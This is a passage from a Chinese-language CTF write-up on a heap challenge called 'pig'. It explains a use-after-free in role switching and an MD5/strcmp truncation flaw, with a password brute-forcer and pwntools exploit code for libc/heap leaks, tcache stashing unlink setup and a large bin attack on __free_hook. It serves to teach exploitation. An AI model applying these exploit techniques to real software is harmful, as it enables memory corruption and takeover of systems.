class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">delete_3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> num; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Input the message index: &quot;</span>);</span><br><span class="line">  num = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( num &lt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( info-&gt;ptr[num] &amp;&amp; !info-&gt;flag1[num] &amp;&amp; !info-&gt;flag2[num] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(info-&gt;ptr[num]);</span><br><span class="line">      info-&gt;flag1[num] = <span class="number">1</span>;</span><br><span class="line">      info-&gt;flag2[num] = <span class="number">1</span>;</span><br><span class="line">      v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>3只猪可以删除的索引范围和可以<code>add</code>的索引范围相同。删除后会将两个标志位置为1。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">80</span>]; <span class="comment">// [rsp+70h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">88</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">         &amp;std::cout,</span><br><span class="line">         <span class="string">&quot;Please enter the identity password of the corresponding user:&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">read_n</span>(s, <span class="number">0x40</span>LL);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;What&#x27;s this?&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">MD5_initalize</span>(v5);</span><br><span class="line">  <span class="built_in">MD5_init1</span>(v5, s, v4);</span><br><span class="line">  <span class="built_in">MD5_init2</span>(v5, (__int64)v7);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v7, <span class="string">&quot;\xA2&#x27;\x90\xD5\xEA\xD5\x37\xA3\xE1\x6D\x4Fc\x17\x7F\xB2X&quot;</span>, <span class="number">0x11</span>uLL)</span><br><span class="line">    || !<span class="built_in">memcmp</span>(v7, <span class="string">&quot;R\xEC\x3C\x4An\x13\&quot;#\xCA\xF9L\xA2\xFA\x8D\x9B&#123;&quot;</span>, <span class="number">0x11</span>uLL)</span><br><span class="line">    <span class="comment">// 第三位为 &#x27;\x00&#x27;，存在提前截断。</span></span><br><span class="line">    || !<span class="built_in">strcmp</span>(v7, <span class="string">&quot;&lt;D\x00T\x92c \xAC\xF0\xAA\x1C\xBA\x8C\xBD\x96\xDA&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)s[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span> &lt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="string">&#x27;B&#x27;</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Couldn&#x27;t find this password!&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">MD5_initalize</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="comment">// MD5魔数</span></span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  a1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  a1[<span class="number">2</span>] = <span class="number">0x67452301</span>;</span><br><span class="line">  a1[<span class="number">3</span>] = <span class="number">0xEFCDAB89</span>;</span><br><span class="line">  a1[<span class="number">4</span>] = <span class="number">0x98BADCFE</span>;</span><br><span class="line">  a1[<span class="number">5</span>] = <span class="number">0x10325476</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据条件爆破密码。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_string</span>(<span class="params">start_char</span>):</span><br><span class="line">    chars = string.ascii_letters + string.digits</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> itertools.product(chars, repeat=<span class="number">5</span>):</span><br><span class="line">        s = start_char + <span class="string">&#x27;&#x27;</span>.join(guess)</span><br><span class="line">        md5_value = hashlib.md5(s.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5_value[:<span class="number">6</span>] == <span class="string">&#x27;3c4400&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(find_string(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(find_string(<span class="string">&#x27;B&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(find_string(<span class="string">&#x27;C&#x27;</span>))</span><br></pre></td></tr></table></figure></div>

<p>需要知道每个角色的密码，才能通过对应密码 <code>md5</code> 的比较判断，但是这里判断用的 <code>strcmp</code>，且其中有个 <code>md5</code> 值中的包含 <code>‘\x00’ </code> ，所以实际上会提前截断，而以<code> ‘\x3c\x44\x00’</code> 开头的 <code>md5</code>，对应的原值其实是有很多的，所以这里可以任意切换角色。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">set_info1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(state, info, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info1.size, info-&gt;size, <span class="built_in">sizeof</span>(state-&gt;info1.size));</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info1.flag2, info-&gt;flag2, <span class="built_in">sizeof</span>(state-&gt;info1.flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">set_info2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;state-&gt;info2, info, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info2.size, info-&gt;size, <span class="built_in">sizeof</span>(state-&gt;info2.size));</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info2.flag2, info-&gt;flag2, <span class="built_in">sizeof</span>(state-&gt;info2.flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">set_info3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;state-&gt;info3, info, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info3.size, info-&gt;size, <span class="built_in">sizeof</span>(state-&gt;info3.size));</span><br><span class="line">  <span class="built_in">memcpy</span>(state-&gt;info3.flag2, info-&gt;flag2, <span class="built_in">sizeof</span>(state-&gt;info3.flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">get_info_1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(info, state, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;size, state-&gt;info1.size, <span class="built_in">sizeof</span>(info-&gt;size));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag1, state-&gt;info1.flag1, <span class="built_in">sizeof</span>(info-&gt;flag1));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag2, state-&gt;info1.flag2, <span class="built_in">sizeof</span>(info-&gt;flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">get_info2</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(info, &amp;state-&gt;info2, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;size, state-&gt;info2.size, <span class="built_in">sizeof</span>(info-&gt;size));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag1, state-&gt;info2.flag1, <span class="built_in">sizeof</span>(info-&gt;flag1));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag2, state-&gt;info2.flag2, <span class="built_in">sizeof</span>(info-&gt;flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">get_info_3</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(info, &amp;state-&gt;info3, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;size, state-&gt;info3.size, <span class="built_in">sizeof</span>(info-&gt;size));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag1, state-&gt;info3.flag1, <span class="built_in">sizeof</span>(info-&gt;flag1));</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;flag2, state-&gt;info3.flag2, <span class="built_in">sizeof</span>(info-&gt;flag2));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在检查函数通过之后，如果我们会更换用户，则会将原来用户分配的<code>chunk</code>复制到一个程序预先分配号的一块空间，然后将新用户的<code>chunk</code>以及标志位等从那一块空间中复制出来。</p>
<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>本题的漏洞就在于用户的分配上。由于新用户只是复制了第二个标志位，对于某个<code>chunk</code>的索引而言，如果原用户的两个对应标志位均为0，而新用户的两个标志位为1，则用户转换后，两个标志位分别为0和1。注意<code>view message</code>和<code>edit message</code>检查的都是第1个标志位是否为0，对于新用户而言，这个索引原本的<code>chunk</code>是已经被释放的，但这样一来我们就可以再一次访问这个<code>chunk</code>，这就产生了<code>UAF</code>。我们可以申请到在<code>tcache</code>保存大小范围的<code>chunk</code>，也可以申请到大于<code>tcache</code>大小的<code>chunk</code>，而且程序通过<code>calloc</code> 分配堆块会跨过 <code>tcache</code>，符合 <code>house of pig</code> 利用条件。关于新版本 <code>largebin_attack</code> 和 <code>tcache_stashing_unlink_attack</code> 请看前言提到的文章。</p>
<p><strong>前置脚本</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pig&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">password = [<span class="string">b&#x27;Aa9nH3&#x27;</span>, <span class="string">b&#x27;BaBqJn&#x27;</span>, <span class="string">b&#x27;CbyWU8&#x27;</span>]</span><br><span class="line">current_user = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content_length, content = <span class="literal">None</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;message size: &#x27;</span>, <span class="built_in">str</span>(content_length).encode())</span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        content = <span class="built_in">str</span>(current_user) * (content_length // <span class="number">0x30</span> * <span class="number">0x10</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_role</span>(<span class="params">role</span>):</span><br><span class="line">    <span class="keyword">global</span> current_user</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;user:\n&#x27;</span>, password[role])</span><br><span class="line">    current_user = role</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure></div>

<p><strong>泄露地址并部署堆</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>():</span><br><span class="line">    <span class="keyword">global</span> libc_base, system, __free_hook, _IO_list_all, heap_address</span><br><span class="line">    <span class="comment"># 部署tcache stashing unlink attack的堆环境</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):      <span class="comment"># make 5 chunk into tcache, mummy index 0~4</span></span><br><span class="line">        add(<span class="number">0xA0</span>)</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x150</span>)    <span class="comment"># peppa index 0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x120 tcache, peppa index 1~7</span></span><br><span class="line">        add(<span class="number">0x150</span>)</span><br><span class="line">        delete(i + <span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)               <span class="comment"># peppa #0 into unsorted bin</span></span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xA0</span>)               <span class="comment"># mummy index 5, split peppa #0</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x160</span>)              <span class="comment"># peppa index 8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x130 tcache, peppa index 9~15</span></span><br><span class="line">        add(<span class="number">0x160</span>)</span><br><span class="line">        delete(i + <span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    view(<span class="number">8</span>)                 <span class="comment"># get libc base address</span></span><br><span class="line">    io.recv(<span class="number">0x10</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x1ECBE0</span></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    __free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    _IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xB0</span>)               <span class="comment"># mummy index 6, split peppa #8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取堆地址</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    view(<span class="number">1</span>)</span><br><span class="line">    io.recv(<span class="number">0x10</span>)</span><br><span class="line">    heap_address = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)        <span class="comment"># get a heap address</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc base: &#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;system: &#x27;</span>, <span class="built_in">hex</span>(system))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__free_hook: &#x27;</span>, <span class="built_in">hex</span>(__free_hook))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;_IO_list_all: &#x27;</span>, <span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;heap address: &#x27;</span>, <span class="built_in">hex</span>(heap_address))</span><br></pre></td></tr></table></figure></div>

<p><code>tcache stashing unlink</code>的堆环境要求有<code>5</code>个<code>chunk</code>位于同一个<code>tcache bins</code>中，同时有2个相同大小的<code>chunk</code>位于<code>small bins</code>，之后通过修改<code>small bins</code>中链首<code>chunk</code>的<code>bk</code>指针可以将任意地址链入到<code>tcache</code>。</p>
<p>这里先将 <code>peppa(0)</code> 放进 <code>unsorted bin</code>，之后将其切分，由于转换身份时存在 <code>UAF</code> 漏洞，可以以此泄露 <code>libc</code> 地址，不过要注意先将对应的 <code>tcache</code> 填满。切分后我们再次申请 <code>0x160</code> 大小的 <code>chunk</code> 将剩余部分放进 <code>small bin</code> 中已备 <code>tcache stashing unlink attack</code> 攻击。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028142942544.png"
                      alt="image-20231028142942544"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028144439713.png"
                      alt="image-20231028144439713"
                ></p>
<p>同理也可以利用身份转换的 <code>UAF</code> 漏洞泄露堆地址，通过 <code>tcache</code> 的 <code>fd</code> 指针泄露堆地址，两次<code>view</code>的机会全部用完了，后面将不能使用<code>view</code>查看。我们这里<code>add(0xb0)</code>时将 <code>unsorted bin</code> 中的 <code>chunk</code> 切割成了 <code>0xb0</code> 大小。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028151045574.png"
                      alt="image-20231028151045574"
                ></p>
<p><strong>第一次large bin attack</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">first_largebin_attack</span>():</span><br><span class="line">    <span class="comment"># first large bin attack</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x440</span>)     <span class="comment"># mummy index = 7</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 16</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 17</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 18</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 19</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x450</span>)     <span class="comment"># mummy index = 8, switch mummy #7 into large bin</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, (p64(__free_hook - <span class="number">0x18</span> - <span class="number">0x18</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 0, complete first large bin attack</span></span><br></pre></td></tr></table></figure></div>

